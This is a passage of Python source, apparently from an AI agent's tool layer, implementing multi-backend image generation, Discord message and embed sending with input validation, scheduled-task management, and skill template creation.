                )
            )
            return

        if channel == "web":
            try:
                image_url = attachment["url"]
                if not image_url.startswith(("/temp/", "data:", "http://", "https://")):
                    blob = await asyncio.to_thread(first_path.read_bytes)
                    image_url = (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    )
                    attachment["url"] = image_url
                await self.bus.publish_outbound(
                    OutboundMessage(
                        channel=channel,
                        chat_id=chat_id,
                        content=caption,
                        metadata={"image": image_url, "attachments": [attachment]},
                    )
                )
            except Exception as e:
                logger.warning(f"Failed to publish generated image preview: {e}")

    async def generate_image(
        self,
        prompt: str,
        model: str = "",
        size: str = "",
        quality: str = "",
        count: int = 1,
        reference_images: Optional[List[str]] = None,
        use_attached_images: Optional[bool] = None,
    ) -> str:
        """Generate or edit image files using text and optional references."""
        prompt = str(prompt or "").strip()
        if not prompt:
            return "Error: prompt is required."

        image_cfg = getattr(self.config, "image_generation", None)
        requested_model = model or getattr(image_cfg, "model", "") or ""
        size = str(size or getattr(image_cfg, "size", "") or "1024x1024").strip()
        quality = (
            str(quality or getattr(image_cfg, "quality", "") or "auto")
            .strip()
            .lower()
        )
        try:
            count = max(1, min(int(count or 1), 4))
        except Exception:
            count = 1

        try:
            references, reference_requested = await self._resolve_image_references(
                reference_images, use_attached_images
            )
        except (OSError, ValueError) as exc:
            return f"Error: {exc}"
        if reference_requested and not references:
            return (
                "Error: The requested reference image is no longer available. "
                "Attach it again and retry."
            )

        candidates = self._image_model_candidates(requested_model)
        if not candidates:
            return (
                "Error: no image generation backend is configured. "
                "Configure Codex OAuth, OPENAI_API_KEY, or GEMINI_API_KEY."
            )

        errors: List[str] = []
        images: List[Dict[str, str]] = []
        used_model = ""
        for candidate in candidates:
            try:
                if self._is_gemini_image_model(candidate):
                    candidate_images = await self._generate_gemini_image(
                        prompt, candidate, count, size, references
                    )
                elif candidate.startswith("openai-codex/"):
                    candidate_images = await self._generate_codex_image(
                        prompt, candidate, count, size, quality, references
                    )
                elif self._is_openai_image_model(candidate):
                    if references:
                        candidate_images = await self._generate_openai_image_edit(
                            prompt,
                            candidate,
                            count,
                            size,
                            quality,
                            references,
                        )
                    else:
                        candidate_images = await self._generate_litellm_image(
                            prompt, candidate, count, size, quality
                        )
                else:
                    candidate_images = await self._generate_codex_image(
                        prompt, candidate, count, size, quality, references
                    )

                if candidate_images:
                    images = candidate_images
                    used_model = candidate
                    break
                errors.append(f"{candidate}: returned no image data")
            except Exception as e:
                logger.warning(f"Image generation attempt failed with {candidate}: {e}")
                errors.append(f"{candidate}: {e}")

        if not images:
            return (
                "Error: image generation failed for all configured backends. "
                + "; ".join(errors[:4])
            )

        output_dir = Path("temp/generated_images").resolve()
        if not self._is_path_allowed(output_dir):
            return "Error: Generated image output directory is not allowed."
        await asyncio.to_thread(output_dir.mkdir, parents=True, exist_ok=True)

        saved: List[Path] = []
        for idx, image in enumerate(images[:count], start=1):
            mime_type = image.get("mime_type") or "image/png"
            ext = self._image_extension_for_mime(mime_type)
            file_name = (
                f"generated_{datetime.now().strftime('%Y%m%d_%H%M%S')}_"
                f"{uuid.uuid4().hex[:8]}_{idx}{ext}"
            )
            out_path = output_dir / file_name
            blob = base64.b64decode(image["b64"])
            await asyncio.to_thread(out_path.write_bytes, blob)
            saved.append(out_path)

        display_paths = [self._to_display_path(path) for path in saved]
        caption = f"Generated image: {display_paths[0]}"
        await self._publish_generated_image_preview(saved, caption)

        return json.dumps(
            {
                "status": "ok",
                "model": used_model,
                "count": len(saved),
                "reference_count": len(references),
                "paths": display_paths,
                "note": "Generated images were saved locally and sent to the active chat when supported.",
            }
        )

    async def send_discord_message(
        self,
        message: str = "",
        channel_id: str = "",
        user_id: str = "",
    ) -> str:
        """Send a plain Discord message to a channel or user DM."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        active_channel = (ctx.get("channel") or "").strip().lower()
        origin_chat_id = str(ctx.get("chat_id") or "").strip()
        target_channel = str(channel_id or "").strip()
        target_user = str(user_id or "").strip()

        if target_channel and target_user:
            return "Error: Pass either channel_id or user_id, not both."

        target_id = target_user or target_channel
        target_kind = "user DM" if target_user else "channel"

        if not target_id:
            if active_channel != "discord":
                return (
                    "Error: channel_id or user_id is required when sending a Discord message outside a Discord conversation."
                )
            target_id = str(ctx.get("chat_id") or "").strip()
            target_kind = "current Discord chat"

        if not target_id or not target_id.isdigit():
            return "Error: Discord channel_id or user_id must be numeric."

        message = str(message or "").strip()
        if not message:
            return "Error: message is required."

        await self.bus.publish_outbound(
            OutboundMessage(
                channel="discord",
                chat_id=target_id,
                content=message,
                metadata={
                    "target_type": "dm" if target_user else "channel",
                    "from_tool": "send_discord_message",
                    "origin_channel": active_channel or None,
                    "origin_chat_id": origin_chat_id or None,
                },
            )
        )
        return f"Sent Discord message to {target_kind} {target_id}."

    async def send_discord_embed(
        self,
        title: str = "",
        description: str = "",
        color: str = "#5865F2",
        footer: str = "",
        image: str = "",
        thumbnail: str = "",
        fields: Optional[List[Dict[str, Any]]] = None,
        channel_id: str = "",
        user_id: str = "",
    ) -> str:
        """Send a native Discord embed via the live Discord channel."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        active_channel = (ctx.get("channel") or "").strip().lower()
        origin_chat_id = str(ctx.get("chat_id") or "").strip()
        target_channel = str(channel_id or "").strip()
        target_user = str(user_id or "").strip()

        if target_channel and target_user:
            return "Error: Pass either channel_id or user_id, not both."

        target_id = target_user or target_channel
        target_kind = "user DM" if target_user else "channel"

        if not target_id:
            if active_channel != "discord":
                return (
                    "Error: channel_id or user_id is required when sending a Discord embed outside a Discord conversation."
                )
            target_id = str(ctx.get("chat_id") or "").strip()
            target_kind = "current Discord chat"

        if not target_id or not target_id.isdigit():
            return "Error: Discord channel_id or user_id must be numeric."

        title = str(title or "").strip()
        description = str(description or "").strip()
        if not title and not description:
            return "Error: title or description is required for a Discord embed."
        if title and len(title) > 256:
            return f"Error: Embed title exceeds 256 characters ({len(title)})."
        if description and len(description) > 4096:
            return f"Error: Embed description exceeds 4096 characters ({len(description)})."

        color = str(color or "#5865F2").strip()
        if not re.fullmatch(r"#[0-9A-Fa-f]{6}", color):
            return f"Error: Invalid color '{color}'. Expected #RRGGBB."

        normalized_fields: List[Dict[str, Any]] = []
        for field in fields or []:
            if not isinstance(field, dict):
                return "Error: Each embed field must be an object."
            name = str(field.get("name") or "").strip()
            value = str(field.get("value") or "").strip()
            if not name or not value:
                return "Error: Each embed field requires both name and value."
            normalized_fields.append(
                {
                    "name": name[:256],
                    "value": value[:1024],
                    "inline": bool(field.get("inline", False)),
                }
            )

        embed_data = {
            "title": title,
            "description": description,
            "color": color,
            "footer": str(footer or "").strip() or None,
            "image": str(image or "").strip() or None,
            "thumbnail": str(thumbnail or "").strip() or None,
            "fields": normalized_fields,
        }
        fallback = title or description[:100]
        await self.bus.publish_outbound(
            OutboundMessage(
                channel="discord",
                chat_id=target_id,
                content=fallback,
                metadata={
                    "embed": embed_data,
                    "target_type": "dm" if target_user else "channel",
                    "from_tool": "send_discord_embed",
                    "origin_channel": active_channel or None,
                    "origin_chat_id": origin_chat_id or None,
                },
            )
        )
        return f"Sent native Discord embed to {target_kind} {target_id}."

    async def list_discord_channels(self) -> str:
        """List Discord guilds and text channels available to the running bot."""
        discord_channel = self._get_channel_by_name("discord")
        if not discord_channel:
            return "Error: Discord channel is not active."

        client = getattr(discord_channel, "client", None)
        if not client or not client.is_ready():
            return "Error: Discord client is not ready."

        guilds_payload: List[Dict[str, Any]] = []
        for guild in getattr(client, "guilds", []) or []:
            text_channels = []
            for ch in getattr(guild, "channels", []) or []:
                if str(getattr(ch, "type", "")) != "text":
                    continue
                text_channels.append(
                    {
                        "id": str(getattr(ch, "id", "")),
                        "name": getattr(ch, "name", ""),
                        "type": str(getattr(ch, "type", "")),
                    }
                )
            guilds_payload.append(
                {
                    "id": str(getattr(guild, "id", "")),
                    "name": getattr(guild, "name", ""),
                    "channels": text_channels,
                }
            )

        return json.dumps({"guilds": guilds_payload}, ensure_ascii=False)

    async def cron_add(
        self,
        message: str,
        context: Dict[str, Any],
        time_expr: str = None,
        cron_expr: str = None,
        tz: str = None,
        name: str = None,
    ) -> str:
        """Add a scheduled task."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            trigger_time = None
            if time_expr:
                import time as time_module

                delta_seconds = 0
                if time_expr.endswith("s"):
                    delta_seconds = int(time_expr[:-1])
                elif time_expr.endswith("m"):
                    delta_seconds = int(time_expr[:-1]) * 60
                elif time_expr.endswith("h"):
                    delta_seconds = int(time_expr[:-1]) * 3600
                elif time_expr.endswith("d"):
                    delta_seconds = int(time_expr[:-1]) * 86400
                else:
                    return f"Error: Invalid time format '{time_expr}'. Use '10s', '5m', '2h'."
                trigger_time = time_module.time() + delta_seconds

            job_id = await self.scheduler.add_job(
                trigger_time=trigger_time,
                message=message,
                context=context,
                cron_expr=cron_expr,
                tz=tz,
                name=name,
            )
            return f"Success: Scheduled job {job_id}"
        except Exception as e:
            return f"Error adding cron: {e}"

    async def cron_list(self) -> str:
        """List all pending scheduled tasks."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            jobs = await self.scheduler.list_jobs()
            if not jobs:
                return "No scheduled tasks."

            res = ["Scheduled Jobs:"]
            for j in jobs:
                trigger_str = (
                    datetime.fromtimestamp(j["trigger"]).strftime("%Y-%m-%d %H:%M:%S")
                    if j.get("trigger")
                    else "N/A"
                )
                recur = f" (RECURS: {j['cron_expr']})" if j.get("cron_expr") else ""
                status = "PAUSED" if j.get("active") is False else "ACTIVE"
                state = j.get("state") or {}
                last_status = state.get("lastStatus") or state.get("last_status")
                duration = state.get("lastDurationMs") or state.get("last_duration_ms")
                name = j.get("name") or j["id"]
                state_bits = []
                if last_status:
                    state_bits.append(f"last={last_status}")
                if duration is not None:
                    state_bits.append(f"{duration}ms")
                state_suffix = f" [{' '.join(state_bits)}]" if state_bits else ""
                res.append(
                    f" - [{j['id']}] [{status}] {name}: {trigger_str}{recur}{state_suffix}\n"
                    f"   {j['payload']}"
                )
            return "\n".join(res)
        except Exception as e:
            return f"Error listing cron: {e}"

    async def cron_remove(self, job_id: str) -> str:
        """Remove a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            if await self.scheduler.remove_job(job_id):
                return f"Success: Removed job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error removing cron: {e}"

    async def cron_deactivate(self, job_id: str) -> str:
        """Pause a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            updated = await self.scheduler.set_job_active(job_id, False)
            if updated:
                return f"Success: Deactivated job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error deactivating cron: {e}"

    async def cron_activate(self, job_id: str) -> str:
        """Resume a scheduled task by ID."""
        if not self.scheduler:
            return "Error: Scheduler not available."
        try:
            updated = await self.scheduler.set_job_active(job_id, True)
            if updated:
                return f"Success: Activated job {job_id}."
            return f"Error: Job {job_id} not found."
        except Exception as e:
            return f"Error activating cron: {e}"

    async def create_skill(self, name: str, description: str) -> str:
        """Initialize a new skill directory with a template SKILL.md."""
        import re

        if not re.match(r"^[a-z0-9_]+$", name):
            return "Error: Skill name must be snake_case (alphanumeric and underscores only)."

        skill_dir = Path("skills") / name
        if skill_dir.exists():
            return f"Error: Skill '{name}' already exists in 'skills/'."

        try:
            skill_dir.mkdir(parents=True, exist_ok=True)
            skill_md = skill_dir / "SKILL.md"
            content = (
                f"---\n"
                f"name: {name}\n"
                f"description: {description}\n"
                f"version: 1.0.0\n"
                f"---\n\n"
                f"# {name.replace('_', ' ').title()}\n\n"
                f"{description}\n\n"
                f"## Usage\n"
                f"Describe how to use this skill here.\n"
            )
            await asyncio.to_thread(skill_md.write_text, content, encoding="utf-8")

            # Reload skills in registry if agent is present
            if self.agent and hasattr(self.agent, "skill_registry"):
                await asyncio.to_thread(self.agent.skill_registry.discover_and_load)

            return f"Success: Created skill '{name}' in 'skills/{name}'. You can now add logic to 'skills/{name}/api.py'."
        except Exception as e:
            return f"Error creating skill: {e}"
